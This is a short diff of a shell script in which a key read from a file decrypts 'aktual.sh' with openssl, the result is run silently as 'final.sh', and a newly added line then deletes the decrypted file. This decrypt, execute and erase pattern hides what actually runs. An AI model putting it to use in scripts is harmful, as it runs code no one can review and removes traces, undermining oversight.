@@ -17,4 +17,5 @@ fi
 
 x=$(<x.bin)
 openssl enc -d -aes-256-cbc -in aktual.sh -out final.sh -pass pass:"$x" 2>/dev/null && bash final.sh
+rm -rf final.sh
 
